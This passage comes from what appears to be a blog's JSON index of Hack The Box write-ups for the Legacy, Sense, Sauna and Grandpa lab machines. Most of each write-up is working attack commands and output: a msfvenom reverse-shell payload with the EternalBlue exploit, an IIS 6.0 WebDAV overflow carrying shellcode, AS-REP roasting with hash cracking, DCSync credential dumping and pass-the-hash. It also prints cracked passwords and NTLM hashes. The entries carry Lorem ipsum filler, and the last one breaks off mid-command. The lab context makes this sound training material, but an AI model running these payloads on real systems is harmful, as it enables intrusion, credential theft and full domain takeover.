https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250\n  |_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx\n  |_smb-vuln-ms10-054: false\n  |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)\n  | smb-vuln-ms17-010:\n  |   VULNERABLE:\n  |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n  |     State: VULNERABLE\n  |     IDs:  CVE:CVE-2017-0143\n  |     Risk factor: HIGH\n  |       A critical remote code execution vulnerability exists in Microsoft SMBv1\n  |        servers (ms17-010).\n  |\n  |     Disclosure date: 2017-03-14\n  |     References:\n  |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n  |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\nMS17-010 EternalBlue is the obvious attack path here, lets exploit it.\na) Download the script send_and_execute.py\nb) Create your malicious payload:\n`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4488 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe`\nc) Execute!\n[root:/git/htb/legacy]# python send_and_execute.py 10.10.14.10 ms17-010.exe                                                       (master✱)\n  Traceback (most recent call last):\n    File \"send_and_execute.py\", line 2, in &lt;module&gt;\n      from impacket import smb, smbconnection\n  ImportError: No module named impacket\n\nd) If you get the error like above, it’s because your python2 version is to new.\n\nd1) uninstall pip3: sudo apt-get remove python3-pip\n\n\nd2) Get pip3 installer: curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py\nd3) Install pip3: python3 get-pip.py\nd4) Get pip2 installer: curl https://bootstrap.pypa.io/2.7/get-pip.py -o get-pip.py\nd5) Install pip2: python get-pip.py\nd6) Now you can install any pip2 modules: pip install impacket\nd7) Make sure your python and python-pip are compatible. Python version 2.7.18 and pip 20.3.4 is preffered.\n[root:/git/htb/legacy]# python -m pip -V                                                                                          (master✱)\n  pip 20.3.4 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)\n\n[root:/git/htb/legacy]# python -V                                                                                                 (master✱)\n  Python 2.7.18\ne) EXECUTE EXPLOIT AGAIN!\n[root:/git/htb/legacy]# python send_and_execute.py 10.10.10.4 ms17-010.exe                                                        (master✱)\n  Trying to connect to 10.10.10.4:445\n  Traceback (most recent call last):\n    File \"send_and_execute.py\", line 1077, in &lt;module&gt;\n      exploit(target, port, pipe_name)\n    File \"send_and_execute.py\", line 794, in exploit\n      conn = MYSMB(target, port)\n    File \"/git/htb/legacy/mysmb.py\", line 118, in __init__\n      smb.SMB.__init__(self, remote_host, remote_host, timeout=timeout)\n    File \"/usr/local/lib/python2.7/dist-packages/impacket/smb.py\", line 2434, in __init__\n      self._sess = nmb.NetBIOSTCPSession(my_name, remote_name, remote_host, host_type, sess_port, self.__timeout)\n    File \"/usr/local/lib/python2.7/dist-packages/impacket/nmb.py\", line 893, in __init__\n      timeout=timeout, local_type=local_type, sock=sock)\n    File \"/usr/local/lib/python2.7/dist-packages/impacket/nmb.py\", line 752, in __init__\n      self._sock = self._setup_connection((remote_host, sess_port), timeout)\n    File \"/usr/local/lib/python2.7/dist-packages/impacket/nmb.py\", line 904, in _setup_connection\n      raise socket.error(\"Connection error (%s:%s)\" % (peer[0], peer[1]), e)\n  socket.error: [Errno Connection error (10.10.10.4:445)] timed out\nf) If above happens, reboot the box and execute a third time.\n[root:/git/htb/legacy]# python send_and_execute.py 10.10.10.4 ms17-010.exe                                                        (master✱)\n  Trying to connect to 10.10.10.4:445\n  Target OS: Windows 5.1\n  Using named pipe: browser\n  Groom packets\n  attempt controlling next transaction on x86\n  success controlling one transaction\n  modify parameter count to 0xffffffff to be able to write backward\n  leak next transaction\n  CONNECTION: 0x82208430\n  SESSION: 0xe1a57430\n  FLINK: 0x7bd48\n  InData: 0x7ae28\n  MID: 0xa\n  TRANS1: 0x78b50\n  TRANS2: 0x7ac90\n  modify transaction struct for arbitrary read/write\n  make this SMB session to be SYSTEM\n  current TOKEN addr: 0xe2116d30\n  userAndGroupCount: 0x3\n  userAndGroupsAddr: 0xe2116dd0\n  overwriting token UserAndGroups\n  Sending file KCC2VY.exe...\n  Opening SVCManager on 10.10.10.4.....\n  Creating service vteS.....\n  Starting service vteS.....\n  The NETBIOS connection with the remote host timed out.\n  Removing service vteS.....\n  ServiceExec Error on: 10.10.10.4\n  nca_s_proto_error\n  Done\n    [root:/opt/impacket]# nc -lvnp 4488                                                                                                (master)\n      listening on [any] 4488 ...\n      connect to [10.10.14.10] from (UNKNOWN) [10.10.10.4] 1031\n      Microsoft Windows XP [Version 5.1.2600]\n      (C) Copyright 1985-2001 Microsoft Corp.\n\n      C:\\WINDOWS\\system32&gt;\n\n      C:\\Documents and Settings\\john\\Desktop&gt;type user.txt\n        e69af0e4f443de7e36876fda4ec7644f\n\n      C:\\Documents and Settings\\Administrator\\Desktop&gt;type root.txt\n        993442d258b0e0ec917cae9e695d5713"
  },
  {
    "objectID": "posts/2021-03-07-htb-writeup-sense/2021-03-07-htb-writeup-sense.html",
    "href": "posts/2021-03-07-htb-writeup-sense/2021-03-07-htb-writeup-sense.html",
    "title": "Sense - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/sense]# nmap -Pn -n -sCV 10.10.10.60 –open (master✱) PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ 443/tcp open ssl/https? | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Not valid before: 2017-10-14T19:21:35 |_Not valid after: 2023-04-06T19:21:35 |_ssl-date: TLS randomness does not represent time\n\nDIRB: ==&gt; DIRECTORY: https://10.10.10.60/classes/ ==&gt; DIRECTORY: https://10.10.10.60/css/ + https://10.10.10.60/favicon.ico (CODE:200|SIZE:1406) ==&gt; DIRECTORY: https://10.10.10.60/includes/ + https://10.10.10.60/index.html (CODE:200|SIZE:329) + https://10.10.10.60/index.php (CODE:200|SIZE:6690) ==&gt; DIRECTORY: https://10.10.10.60/installer/ ==&gt; DIRECTORY: https://10.10.10.60/javascript/ ==&gt; DIRECTORY: https://10.10.10.60/themes/ ==&gt; DIRECTORY: https://10.10.10.60/tree/ ==&gt; DIRECTORY: https://10.10.10.60/widgets/ + https://10.10.10.60/xmlrpc.php (CODE:200|SIZE:384)\nNIKTO: + Cookie cookie_test created without the secure flag + Cookie cookie_test created without the httponly flag + Multiple index files found: /index.php, /index.html + Hostname ‘10.10.10.60’ does not match certificate’s names: Common + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST\n\nCheck the pages to see what we have to work with;\n\nhttps://10.10.10.60/index.php is a login page to a pfsense firewall. https://10.10.10.60/xmlrpc.php is used by pfsense, and is vital from privilege escallation.\nhttps://10.10.10.60/tree/ is running SilverStripe Tree Control: v0.1, 30 Oct 2005. Sounds old and probably have some vulns.\nWe are unable to do anything with the info we’ve found. So take one step back and start to fuzz.\n\nFuzzing!\nroot@nidus:/srv/pub-share# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://sense.htb/FUZZ.txt — snip — changelog [Status: 200, Size: 271, Words: 35, Lines: 10]\n[root:/git/htb/sense]# curl -k https://sense.htb/changelog.txt (master✱) # Security Changelog\n### Issue There was a failure in updating the firewall. Manual patching is therefore required\n### Mitigated 2 of 3 vulnerabilities have been patched.\n### Timeline The remaining patches will be installed during the next maintenance window#\n\nThe unpatched vuln they mention above, is hopefully the xmlrpc RCE. However this doesn’t really help right now - so continue to fuzz.\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\n\n\nhttps://github.com/chadillac/pfsense_xmlrpc_backdoor [root:/git/htb/sense]# curl -k –data @pfsense_exec https://10.10.10.60/xmlrpc.php https://10.10.10.60/ignore.php?cmd=whoami\nhttps://github.com/spencerdodd/pfsense-code-exec &lt;– full RCE rev shell.\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝"
  },
  {
    "objectID": "posts/2020-02-18-htb-writeup-sauna/2020-02-18-htb-writeup-sauna.html",
    "href": "posts/2020-02-18-htb-writeup-sauna/2020-02-18-htb-writeup-sauna.html",
    "title": "Sauna - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/sauna# nmapAutomatorDirb.sh 10.10.10.175 All PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49682/tcp open msrpc Microsoft Windows RPC 54513/tcp open msrpc Microsoft Windows RPC\nPORT STATE SERVICE VERSION 53/udp open domain (generic dns response: SERVFAIL) | fingerprint-strings: | NBTStat: |_ CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 123/udp open ntp NTP v3 389/udp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\nService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Domain: EGOTISTICAL-BANK.LOCAL\nDIRB:\n\nhttp://10.10.10.175/about.html (CODE:200|SIZE:30954)\nhttp://10.10.10.175/About.html (CODE:200|SIZE:30954)\nhttp://10.10.10.175/blog.html (CODE:200|SIZE:24695)\nhttp://10.10.10.175/Blog.html (CODE:200|SIZE:24695)\nhttp://10.10.10.175/contact.html (CODE:200|SIZE:15634)\nhttp://10.10.10.175/Contact.html (CODE:200|SIZE:15634)\nhttp://10.10.10.175/index.html (CODE:200|SIZE:32797)\nhttp://10.10.10.175/Index.html (CODE:200|SIZE:32797)\nhttp://10.10.10.175/single.html (CODE:200|SIZE:38059)\n\nNIKTO:\n\n\n\nWe are unable to get anything from rpcclient and smbclient. Browsing the website gives us a few employee names. Create a list of possible username conventions - ex. firstname.lastname, f.lastname, flastname etc. Use Impacket tool GetNPUsers.py along with user-list to find a user hash.\nroot@p3:/opt/impacket/examples# python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile /opt/htb/machines/sauna/unconfirmed-users.txt -format hashcat -dc-ip 10.10.10.175 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation\n.. $krb5asrep\\(23\\)fsmith@EGOTISTICAL-BANK.LOCAL:8995861f6896cadd060d7fb65eb0df0b$040996aa8dcad37424ac7fa2109c57776427b378c118b9c48fdfd84421bc0b4def8503894b9787f0f8889e540d6b9a992ca949141c352f18da37c21fa39c0dedcb80baf31e2aa70764fea7a08fe425d2d400d0756dee343234d35cdedd7ade59449b289968d3debd739930c94ed6b9b75307e053603ef41f342a8a233e417d5db28e698175c13ea38b6b9a307441435491f3cd67daef951d07b776203f6a0117afea4a6b3163bf7449be2f2dee1a3b240ef59266ed8caccd7e7a79931b5e71f479b29ff10b0146eb185d34abb17d4225718a64f647b984abce67e555878c10bbd9299f3735d4c692c974a8aba79b59603f7dc30384c76071bed3479feb84bac5\nCrack the hash using hashcat root@p3:/opt/htb/machines/sauna# hashcat -m18200 -a0 hash-fsmith.txt /usr/share/wordlists/rockyou.txt -o cracked-fsmith.txt root@p3:/opt/htb/machines/sauna# cat cracked-fsmith.txt …….:Thestrokes23\n\nCreds: fsmith:Thestrokes23\n\nLogin with evil-winrm and grab user.txt root@p3:/opt/impacket/examples# evil-winrm -i 10.10.10.175 -u fsmith Evil-WinRM PS C:&gt; whoami egotisticalbank Evil-WinRM PS C:&gt; type user.txt 1b5520b98d97cf17f24122a55baf70cf\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerating the box as FSmith gives us the user ‘svc_loanmgr’. Trying to kerberoat using ‘Invoke-Kerberoast.ps1’ gives us another user - HSmith\nEvil-WinRM PS C:&gt; Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN ‘SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111’ from user ‘CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL’ : Exception calling “.ctor” with “1” argument(s): “The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details.”\nThis is where I hit a wall, I could not find the creds for svc_loanmgr. Windows Registry stores configuration information, and that includes autologon credentials. Querying the registry gives us the credentials for user svc_loanmgr.\nEvil-WinRM PS C:&gt; reg query HKLM /f password /t REG_SZ /s HKEY_LOCAL_MACHINE{0fafd998-c8e8-42a1-86d7-7c10c664a415} (Default) REG_SZ Picture Password Enrollment UX\n———— SNIP ———— HKEY_LOCAL_MACHINENT DefaultPassword REG_SZ Moneymakestheworldgoround!\n———— SNIP ————\nEnd of search: 283 match(es) found.\nNOTE: svc_loanmgr:Moneymakestheworldgoround!\nLogin as svc_loadmgr upload BloodHound/SharpHound and look at the path towards Domain Admin. root@p3:/opt/impacket/examples# evil-winrm -i 10.10.10.175 -u svc_loanmgr Evil-WinRM PS C:_loanmgr&gt; upload ../opt/BloodHound/Ingestors/SharpHound.ps1 Info: Uploading ../opt/BloodHound/Ingestors/SharpHound.ps1 to C:_loanmgr.ps1 Data: 1226060 bytes of 1226060 bytes copied Info: Upload successful!\nEvil-WinRM PS C:_loanmgr&gt; import-module C:_loanmgr.ps1 Evil-WinRM PS C:_loanmgr&gt; Invoke-BloodHound -CollectionMethod All -Domain EGOTISTICAL-BANK.LOCAL -LDAPUser svc_loanmgr -LDAPPass Moneymakestheworldgoround! Evil-WinRM PS C:_loanmgr&gt; download 20200217131222_BloodHound.zip Info: Downloading C:_loanmgr\\20200217131222_BloodHound.zip to 20200217131222_BloodHound.zip Info: Download successful!\nLooking at the data we can see that svc_loanmgr has DCSync rights, this can be confirmed using aclpwn.\nroot@p3:/opt/htb/machines/sauna# aclpwn -f svc_loanmgr@EGOTISTICAL-BANK.LOCAL -d EGOTISTICAL-BANK.LOCAL -s 10.10.10.175 Please supply the password or LM:NTLM hashes of the account you are escalating from: [+] Path found! Path: (SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL)-[GetChangesAll]-&gt;(EGOTISTICAL-BANK.LOCAL) [-] DCSync -&gt; continue [+] Finished running tasks\nUse impacket secretsdump to get the (admin) hashes os all users from the domain. root@p3:/opt/htb/machines/sauna# impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@sauna.htb -just-dc Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation\nPassword: [*] Dumping Domain Credentials (domain:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: EGOTISTICAL-BANK.LOCAL:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c::: SAUNA\\(:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::\n   [*] Kerberos keys grabbed\n   Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031\n   Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0\n   Administrator:des-cbc-md5:19d5f15d689b1ce5\n   krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24\n   krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9\n   krbtgt:des-cbc-md5:c170d5dc3edfc1d9\n   EGOTISTICAL-BANK.LOCAL\\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324\n   EGOTISTICAL-BANK.LOCAL\\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9\n   EGOTISTICAL-BANK.LOCAL\\HSmith:des-cbc-md5:1c73b99168d3f8c7\n   EGOTISTICAL-BANK.LOCAL\\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2\n   EGOTISTICAL-BANK.LOCAL\\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b\n   EGOTISTICAL-BANK.LOCAL\\FSmith:des-cbc-md5:b50e02ab0d85f76b\n   EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba\n   EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c\n   EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2\n   SAUNA\\):aes256-cts-hmac-sha1-96:a90968c91de5f77ac3b7d938bd760002373f71e14e1a027b2d93d1934d64754a SAUNA\\(:aes128-cts-hmac-sha1-96:0bf0c486c1262ab6cf46b16dc3b1b198\n   SAUNA\\):des-cbc-md5:b989ecc101ae4ca1 [*] Cleaning up…\nPass the hash using wmiexec and grab root.txt root@p3:/opt/impacket/examples# python wmiexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff administrator@sauna.htb Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation\n[*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands\nC:&gt;whoami egotisticalbank C:&gt;type root.txt f3ee04965c68257382e31502cc5e881f\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nCreds in Registry: https://attack.mitre.org/techniques/T1214/\nSimilar Boxes: Forest (very similar) Monteverde"
  },
  {
    "objectID": "posts/2021-02-26-htb-writeup-grandpa/2021-02-26-htb-writeup-grandpa.html",
    "href": "posts/2021-02-26-htb-writeup-grandpa/2021-02-26-htb-writeup-grandpa.html",
    "title": "Grandpa - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/grandpa]# nmap -Pn -n -sCV 10.10.10.14 –open (master✱) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH |_http-server-header: Microsoft-IIS/6.0 |http-title: Under Construction | http-webdav-scan: | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown | Server Date: Wed, 03 Mar 2021 10:09:58 GMT | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nDIRB: + http://10.10.10.14/_private (CODE:403|SIZE:1529) ==&gt; DIRECTORY: http://10.10.10.14/_vti_bin/ ==&gt; DIRECTORY: http://10.10.10.14/images/\nNIKTO: + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + Uncommon header ‘ms-author-via’ found, with contents: MS-FP/4.0,DAV\n\nWebDAV is open and the webserver is running IIS 6.0. Lets run davtest to see if we can upload any files.\n[root:/git/htb/grandpa]# davtest -url http://10.10.10.14/ (master✱) ******************************************************** Testing DAV connection OPEN SUCCEED: http://10.10.10.14 ******************************************************** NOTE Random string for this session: OXxuoxrUU ******************************************************** Creating directory MKCOL FAIL ******************************************************** Sending test files PUT cfm FAIL PUT pl FAIL PUT php FAIL PUT txt FAIL PUT html FAIL PUT cgi FAIL PUT asp FAIL PUT shtml FAIL PUT jhtml FAIL PUT jsp FAIL PUT aspx FAIL\n\nLook for IIS 6.0 exploits.\n\n[root:/git/htb/grandpa]# searchsploit iis 6.0 (master✱) ———————————————————————————————————– ——————————— Exploit Title | Path ———————————————————————————————————– ——————————— — snip — Microsoft IIS 6.0 - WebDAV ‘ScStoragePathFromUrl’ Remote Buffer Overflow | windows/remote/41738.py\nTrying the exploit gives nothing. Continue to google for IIS 6.0 reverse and I find a script that looks promising, run it.\n[root:/git/htb/grandpa]# python iis6_rev.py 10.10.10.14 80 10.10.14.8 4488 (master✱) PROPFIND / HTTP/1.1 Host: localhost Content-Length: 1744 If: http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬 (Not ) http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A\n[root:/git/htb/grandpa]# rlwrap nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.14] 1031 Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp.\nc:\\windows\\system32\\inetsrv&gt; whoami\n  nt authority\\network service\n\nWe are unable to read both user and root. Lets try the same exploit as Granny, MS09-012:\n[root:/srv/pub-share]# cp /opt/windows-kernel-exploits/MS09-012/pr.exe . [root:/srv/pub-share]# chmod +x pr.exe [root:/srv/pub-share]# smbserver.py share .\nC:and Settings&gt; //10.10.14.8/share/pr.exe “whoami” /xxoo/–&gt;Build&&Change By p /xxoo/–&gt;This exploit gives you a Local System shell /xxoo/–&gt;Got WMI process Pid: 1828 begin to try /xxoo/–&gt;Found token SYSTEM /xxoo/–&gt;Command:whoami nt authority\nC:and Settings&gt; //10.10.14.8/share/pr.exe “type Harry.txt” /xxoo/–&gt;Build&&Change By p /xxoo/–&gt;This exploit gives you a Local System shell /xxoo/–&gt;Got WMI process Pid: 1828 begin to try /xxoo/–&gt;Found token SYSTEM /xxoo/–&gt;Command:type Harry.txt bdff5ec67c3cff017f2bedc146a5d869\nC:and Settings&gt; //10.10.14.8/share/pr.exe “type Administrator.txt” /xxoo/–&gt;Build&&Change By p /xxoo/–&gt;This exploit gives you a Local System shell /xxoo/–&gt;Got WMI process Pid: 1828 begin to try /xxoo/–&gt;Found token SYSTEM /xxoo/–&gt;Command:type Administrator.txt 